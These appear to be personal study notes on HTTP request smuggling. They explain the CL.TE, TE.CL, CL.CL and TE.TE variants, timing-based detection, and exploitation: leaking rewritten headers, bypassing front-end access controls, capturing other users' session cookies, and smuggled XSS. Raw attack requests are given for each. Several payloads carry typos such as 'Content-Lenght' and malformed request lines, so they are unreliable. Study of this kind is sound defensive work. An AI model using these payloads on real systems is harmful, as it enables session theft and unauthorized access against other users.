## Background
* Web applications often employ a chain of multiple web-servers between the end user and application logic:
	* Load Balancers
	* Revere Proxies
* When HTTP requests are forwarded to back-end server they typically send multiple requests over the same back-end network connection. 
	* Designed to decrease networking overheads and increase performance 
# What is HTTP Request Smuggling 
* Attack technique that that exploits differences in how a web front-end and back-end delineate requests in order to smuggle through requests to the back end that the front-end is unaware off.
* Frequently critical in nature allowing an attacker to bypass webapp security posture, gain unauthorised access to sensitive data, and compromise other webapp users via XSS or off-site redirects. 
## How does it Occur?
* An attacker might be able to send a malicious request that gets interpreted differently by the front and back-end disagree  about the boundaries between requests.
* If 2 users are both required to send 3 requests and the attacker sends 4. The 4th request may get interpreted as the second user and reply in accordance to them. 
## Why Does it Occur?
* Most attacks occur due to the HTTP specification allowing 2 different ways to specify where a request finishes.
	1. `Content-Length` specifies the length of the message body in bytes
	2. `Transfer-Encoding` specifies tat the message body contains one more chunks of data. Each chunk within the body starts with the chunk size in bytes (in hex), then a new line. The message is terminated with a chunk size of 0.
* An Attacker can then use both methods simultaneously, such as that they conflict with each other. 
	* HTTP is configured that when they are both set then `content-length` should be ignored.
* This becomes exploitable when messages are being handed off by two or more servers that are chained together.
	* Some servers do not support `Transfer-Encoding`
	* Some servers that do support it can be persuaded not to processes it if the header is obfuscated or malformed. 
* If the front-end and back-end server handle `Transfer-Encoding` differently and therefore behave differently with it, then it might be possible to have them disagree about the boundaries between messages. 
# Types of Request Smuggling
* The aim is to create a condition whereby the tow servers disagree on boundaries between messages, allowing an attacker to smuggle part of their message in with a legit request.  
## CL.TE
* The front end server uses the `Content-Length` header and the back-end uses the `Transfer-Encoding` header.
```HTTP
POST / HTTP/1.1
Host: Test.com
Content-Length: 31
Transfer-Encoding: chunked

0

Smuggled Request
```
1. The front-end interprets the `Content-Length` and sends the whole message
2. The back-end interprets the `Transfer-Encoding` and when it processes the first chunk, it reads the 0 which denotes the end of the request. 
3. The following bytes remain in the que. The server will interpret these on the next request. 
## TE.CL
* The front-end server uses the `Transfer-Encoding` header and the back-end uses the `Content-Length`
```HTTP
POST / HTTP/1.1
Host: Test.com
Content-Length: 4
Transfer-Encoding: chunked

1a
Smuggled Request
0
```
1. The front-end uses the `Transfer-encoding` and handles the body using chunk encoding 
	1. It reads the first chunk which is given a length of `1a` or 26.
	2. The second chunk it processes is 0 which is the end of the message
2. The back-end uses the `Content-Length` header and determines the message to be 4 bytes long *(This includes `/n`)*. This takes it up to the start of the smuggled request. 
3. The smuggled request sits in the queue
```
To Do this in Burp you need to go to the repeater menu and ensure `Update Content-Length` is unchecked.
You need to include the trailing sequce of \r\n\r\n following the final 0 as per the HTTP spec
```
## CL.CL
* Double `Content-Length` attack relies on poorly coded middle-ware such as proxies or load-balancers, which loosely handle `GET` requests with a body. The `GET` method shouldn't have a body, this may leader to weird behaviour.
```HTTP
POST / HTTP/1.1
Host: Test.com
Content-Length: 31
Content-Length: 0

Smuggled Request
```
1. The front-end reads the first content-length and processes the rest of the message
2. The back-end, if designed to only expect `GET` requests without a body may reject the first `Content-Length` and process the second `Content-Length` header as 0
```
To Do this in Burp you need to go to the repeater menu and ensure `Update Content-Length` is unchecked.
You need to include the trailing sequce of \r\n\r\n following the final 0 as per the HTTP spec
```
## TE.TE
* The front-end and back-end both support (and prioritise) the `Transfer-Encoding` header. 
* Typically this involves a small departure from the HTTP specification.
```HTTP
POST / HTTP/1.1
Host: Test.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: cow

1a
Smuggled Request
0
```
1. Submit a request with 2 `Transfer-Encoded` headers. One with n obfuscated name and one with a non-existent `Transfer-Encoded` type with an invalid `Content-Length` header. 
2. The goal is to get one server to accept the obfuscated name, and the other server ignore it, and read the header with the non-existent `Transfer-Encoding` type. 
# Finding Vulnerabilities
## Timing Technique 
* Send requests that result in a time delay if the vulnerability is present.
* Technique used by Burp Scanner to automate detection. 
* Method to introduce time delay:
	1. Induce a time delay in the web application by sending a request that the application thinks is incomplete. 
* Timing techniques are always at risk of false positives. 
* These requests are likely visible to other site users. Garbage is likely left on the back end message queue, this can result in malformed legitimate requests by the next user.
### Finding CL.TE
```HTTP
POST / HTTP/1.1
Host: Test.com
Transfer-Encoding: chunked
Content-Length: 6

3
abc
0
```
1. The front-end server uses the `Content-Length` header which will cause the final 0 character to be omitted. when forwarded to the back-end. 
2. The back-end server uses the `Transport-Encoding` header and thus chunked encoding in this instance. 
3. If the vulnerability is present the final 0 omitted, causing the back-end server to hand and wait for the next chunk. This will cause a noticeable delay in response. 
* All other combinations will cause a normal response time and often a `500 internal server error`
### Finding TE.CL 
```HTTP
POST / HTTP/1.1
Host: Test.com
Transfer-Encoding: chunked
Content-Length: 6

0 

abc
```
1. The front end server uses `Transfer-Encoding` header and it will only forward part of the message omitting the final abc
2. If the vulnerability is present the final 0 omitted then as the back-end server is using `Content Length` the request will hand as the back-end is expecting more data. 
* All other combinations will cause a normal response time and often a `500 internal server error`
## Confirming Vulnerabilities 
* Once a potential vulnerability has been identified, this needs to be confirmed before continuing. 
* A simple way to do this is to craft a small "attack" HTTP request with a basic payload and a "normal" HTTP request to follow it. 
* If the attack is present then the request will interfere with the second request. 
	* This may result in a notably different response time from the second request. 
* If the front-end load-balances requests to a number of back-end servers, multiple attempts may be required to encounter a situation in which the second "normal" request ends up at the same back-end server as your attack.
	* Can send one attack request followed by spamming several normal requests. 
		* Script easily in python
### Confirming TE.CL
#### Example Normal Request 
```HTTP
POST /profile HTTP/1.1
Host: Test.com
Content-Length: 8

u=person
```
#### Attack Request 
```HTTP
POST / HTTP/1.1
Host: Test.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

84
GET /fake_page HTTP/1.1
HOST mysite.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4

blah
0
```
#### Victim Request
```HTTP
GET /fake_page HTTP/1.1
HOST mysite.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4

blah
0

POST /profile HTTP/1.1
Host: Test.com
Content-Length: 8

u=person
```
This causes a `GET` request on a non existent page and the victim will get a `404 error`
### Confirming  CL.TE
#### Example Normal Request 
```HTTP
POST /profile HTTP/1.1
Host: Test.com
Content-Length: 8

u=person
```
#### Attack Request
```HTTP
POST /profile HTTP/1.1
Host: Test.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Transfer-Encoding: chunked

u=person
0

GET /fake_page HTTP/1.1
Host: mypage.ocom
Content-Type: application/x-www-form-urlencoded
Content-Length: 152
blah
```
#### Victim Request
```HTTP
GET /fake_page HTTP/1.1
Host: mypage.ocom
Content-Type: application/x-www-form-urlencoded
Content-Length: 152
blahPOST /profile HTTP/1.1
Host: Test.com
Content-Length: 8

u=person
```
This will cause a 404 error request
# Exploiting Vulnerability 
## Revealing Front-end Request Rewriting
* Often the front-end server will add or re-write some headers into the HTTP request before handing it to the back-end server:
	* X-Forwarded-For Headers with the users IP address
	* A determined user ID derived from the user sessions token
	* Information about TLS protocol and cipher suites used during the transaction. (TLS must terminate at the front-end if request re-writing is occurring)
* These headers are useful for an attacker as they might contain key information needed to bypass security measures. 
* Need to find a `POST` request that reflects the value of the request parameter back to us. 
	* Login functionality that re-populates the username after a failed login attempt
	* Search functionality that tells you "x results found for y"
### Reflection Point
```HTTP
POST /search HTTP/1.1
Host: test.com
Content-Type: application/x-www-form-urlencoded
Content-Lenght: 31

search=blahblahblah&language=EN
```

```HTML
<h1>
	0 search results for 'blahblahblah'
</h1>
```

### Attack Request 
```HTTP
POST /search HTTP/1.1
Host: test.com
Content-Type: application/x-www-form-urlencoded
Content-Lenght: 129
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: test.com
Content-Type: application/x-www-form-urlencoded
Content-Lenght: 100

language=EN&search=POST /login HTTP/1.1
Host: test.com
<snip>
```
Need to set the `Content-Length` to 100 as we don't no how long the request is.
Best to start small and increase.
### Response
```html
<h1>
	0 search results for 'POST /login HTTP/1.1
	Host test.com
	UID: 7367
	X-Forwarded-For: 13.113.31.185
	X-Forward'
</h1>
```
## Bypassing Front-End Access Controls
* Request a restricted URL, that you don't have access to along with a legitimate request. 
### Request Smuggling
```HTTP
POST / HTTP/1.1
Host: Test.com
Content-Type: application/x-www-form-urlencoded
Content-Lenght: 61
Transfer-Encoding: chunked

0

GET /admin /HTTP/1.1
HOST: test.com
Fake-Header:
```
## Revealing Other User Requests 
* If you find some other functionality that allows data storage and retrieval, its possible to use HTTP requests smuggling to reveal the contents of other users. 
	* Sensitive data such as auth-tokens or cookies
* Look for comments, profile edits or image uploads.
### Storage function 
```http
POST /update-profile HTTP/1.1
Host: test.com
Content-Type: application/x-www-form-urlencoded
Content-Lenght: 70
Cookie: session=91as8d907ascdsa978shcajn

update_bio=This%20is%20my%20profile&lang=EN&user=hax0r
```

```html
<h1>
User Profile: hax0r
</h1>
<p>
	This is my profile
</p>
```
### Attack Request 
* The intent is to smuggle a request onto the back-end with the intention of capturing the next user request. 
* The search requests need to be shuffled so the reflection is at the end. 
* We care mostly about headers rather than message content 
```http
POST /update-profile HTTP/1.1
Host: test.com
Content-Type: application/x-www-form-urlencoded
Content-Lenght: 129
Transfer-Encoding: chunked

0

POST /update_profile HTTP/1.1
Host: test.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Cookie: session=91as8d907ascdsa978shcajn

language=EN&user=hax0r&update_bio=
```
Stolen session token
```HTML
<h1>
User Profile: hax0r
</h1>
<p>
	GET /admin.php
	Host: test.com
	session=vguESD9823jkWjkfjeWdfd9d833
</p>
```
## Smuggled XSS
* Has a number of advantages over normal XSS:
	1. Doesn't require user interaction, They will be served the request by browsing to the site
	2. You can use this mechanism to open the XSS attack-surface
### XSS Reflection Point
```HTTP
POST /profile HTTP/1.1
Host: test.com
User-Agent: <script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Lenght: 8

u=person
```

```HTML
<p>
	<b>You're using:</b><script>alert(1)</script>
</p>
```
### Attack Request
```HTTP
POST / HTTP/1.1
Host: test.com
Content-Type: application/x-www-form-urlencoded
Content-Lenght: 162
Transfer-Encoding: chunked

0

POST /profile HTTP/1.1
Host: test.com
User-Agent: <script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Lenght: 8

u=person
```